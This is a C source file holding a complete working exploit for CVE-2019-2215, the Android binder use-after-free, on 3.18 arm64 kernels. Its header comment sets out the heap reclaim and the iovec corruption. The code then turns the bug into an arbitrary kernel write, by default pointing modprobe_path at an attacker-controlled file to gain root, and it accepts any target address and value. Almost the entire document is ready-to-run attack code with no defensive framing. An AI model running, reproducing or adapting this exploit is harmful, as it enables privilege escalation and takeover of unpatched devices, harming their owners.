/*
 * CVE-2019-2215 (binder UAF) -> arbitrary kernel write, 3.18 arm64 (MSM8996)
 *
 * Kernel facts (verified by disassembly of Image.elf):
 *   binder_poll registers &thread->wait (thread+0x98) into the epoll
 *   BINDER_THREAD_EXIT frees binder_thread (kzalloc 0x190 -> kmalloc-512)
 *   readv(pipe, 25 iov) imports a 400-byte iovec array (kmalloc-512) and
 *   blocks in pipe_read, so the freed slot is reclaimed by our iovecs.
 *   epoll_ctl(DEL) -> remove_wait_queue -> list_del on the (freed) wq head:
 *        chunk+0xA0 (iov[10].base) = chunk+0xA0
 *        chunk+0xA8 (iov[10].len)  = chunk+0xA0   (huge)
 *   ticket spin unlock writes 0x10001 over chunk+0x98 (iov[9].len).
 *
 * copy_page_to_iter() has NO access_ok on the destination and walks iovs
 * inside one call; after a segment it re-reads iov_len and advances only
 * if offset == iov_len.  So:
 *   - deliver exactly 0x10001 bytes  -> consumed by iov[9] (big user buf)
 *   - deliver exactly 32 bytes       -> they land at chunk+0xA0.  Those 32
 *     bytes redefine iov[10].len = 32 (== offset, triggers advance) and
 *     iov[11] = {target, 18}
 *   - deliver the remaining 18 bytes -> copied to target
 *
 * The 32-byte payload is written right after the 0x10001-byte fill: it
 * either merges into the 1-byte tail pipe buffer (33 bytes: 1 -> iov[9],
 * 32 -> chunk+0xA0) or forms its own 32-byte buffer.  Both are correct.
 * The final 18 bytes are sent in a 4096-byte write so pipe_write skips the
 * merge (total_len & 0xfff == 0) and creates a separate pipe buffer.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>

#define BINDER_THREAD_EXIT 0x40046208u
#define IOV_N 25
#define FILL 0x10001UL          /* iov[9].len after remove_wait_queue */
#define PAYLOAD 32
#define MODPROBE_PATH 0xffffffc001815540UL

static unsigned char dummy[4096] __attribute__((aligned(64)));
static unsigned char *big;      /* fill sink, must be > FILL bytes */
static unsigned char *fillbuf;

static void pin_cpu0(void)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    if (sched_setaffinity(0, sizeof(set), &set) != 0)
        perror("setaffinity");
}

static void show_modprobe(void)
{
    char buf[256];
    int fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
    ssize_t n;
    if (fd < 0) { perror("open modprobe"); return; }
    n = read(fd, buf, sizeof(buf) - 1);
    if (n > 0) { buf[n] = 0; printf("modprobe_path: %s", buf); }
    close(fd);
}

static int try_once(unsigned long target, const unsigned char *out, size_t datalen)
{
    int epfd, bfd, pfd[2];
    struct iovec iov[IOV_N];
    struct epoll_event ev;
    unsigned char payload[PAYLOAD];
    unsigned char data[4096];
    pid_t pid;
    ssize_t r;
    int i, st;

    bfd = open("/dev/binder", O_RDONLY);
    if (bfd < 0) { perror("open /dev/binder"); return -1; }
    epfd = epoll_create1(0);
    if (epfd < 0) { perror("epoll_create1"); close(bfd); return -1; }
    memset(&ev, 0, sizeof(ev));
    ev.events = EPOLLIN;
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev) != 0) {
        perror("epoll add"); close(epfd); close(bfd); return -1;
    }
    if (pipe(pfd) != 0) { perror("pipe"); return -1; }
    /* need room for the 0x10001 fill without blocking; default is 64K */
    if (fcntl(pfd[1], F_SETPIPE_SZ, 1 << 17) < 0)
        perror("F_SETPIPE_SZ");

    memset(iov, 0, sizeof(iov));
    for (i = 0; i < IOV_N; i++) iov[i].iov_base = dummy;
    iov[9].iov_base  = big;
    iov[9].iov_len   = 0;                    /* becomes 0x10001 */
    iov[10].iov_base = big;
    iov[10].iov_len  = FILL + PAYLOAD + datalen;  /* import-time total */

    memset(payload, 0, sizeof(payload));
    *(uint64_t *)(payload + 0)  = 0;         /* iov[10].base (unused) */
    *(uint64_t *)(payload + 8)  = PAYLOAD;   /* iov[10].len == offset */
    *(uint64_t *)(payload + 16) = target;    /* iov[11].base */
    *(uint64_t *)(payload + 24) = datalen;   /* iov[11].len */

    memset(data, 0, sizeof(data));
    memcpy(data, out, datalen);

    pid = fork();
    if (pid < 0) { perror("fork"); return -1; }
    if (pid == 0) {
        usleep(300000);                       /* let parent import + block */
        if (epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, &ev) != 0) _exit(1);
        if (write(pfd[1], fillbuf, FILL) != (ssize_t)FILL) _exit(2);
        if (write(pfd[1], payload, PAYLOAD) != PAYLOAD) _exit(3);
        if (write(pfd[1], data, sizeof(data)) != (ssize_t)sizeof(data)) _exit(4);
        usleep(200000);
        _exit(0);
    }

    ioctl(bfd, BINDER_THREAD_EXIT, NULL);     /* free binder_thread */
    r = readv(pfd[0], iov, IOV_N);            /* reclaim + iterate */
    printf("readv=%zd (want %lu) errno=%d\n", r, FILL + PAYLOAD + datalen, errno);

    waitpid(pid, &st, 0);
    close(pfd[0]); close(pfd[1]);
    close(epfd); close(bfd);
    return (int)r;
}

int main(int argc, char **argv)
{
    unsigned long target = MODPROBE_PATH;
    unsigned char data[64];
    size_t datalen;

    setvbuf(stdout, NULL, _IONBF, 0);
    pin_cpu0();

    big = mmap(NULL, 0x30000, PROT_READ | PROT_WRITE,
               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (big == MAP_FAILED) { perror("mmap"); return 1; }
    memset(big, 0, 0x30000);

    fillbuf = malloc(FILL);
    if (!fillbuf) { perror("malloc"); return 1; }
    memset(fillbuf, 'A', FILL);

    if (argc >= 2) {
        target = strtoul(argv[1], NULL, 0);
        if (argc >= 3 && argv[2][0] == '0' && argv[2][1] == 'x') {
            /* numeric mode: w2215 <target> 0x<value> [len] */
            unsigned long long v = strtoull(argv[2], NULL, 0);
            unsigned len = argc >= 4 ? (unsigned)strtoul(argv[3], NULL, 0) : 8;
            if (len > 8) len = 8;
            memcpy(data, &v, 8);
            datalen = len;
            printf("target=0x%lx value=0x%llx len=%zu\n", target, v, datalen);
        } else {
            datalen = strlen(argv[2]) + 1;
            memcpy(data, argv[2], datalen);
            printf("target=0x%lx data=%s len=%zu\n", target, argv[2], datalen);
        }
    } else {
        datalen = strlen("/data/local/tmp/mp") + 1;
        memcpy(data, "/data/local/tmp/mp", datalen);
        printf("target=0x%lx data=%s\n", target, data);
    }

    show_modprobe();
    try_once(target, data, datalen);
    show_modprobe();
    return 0;
}
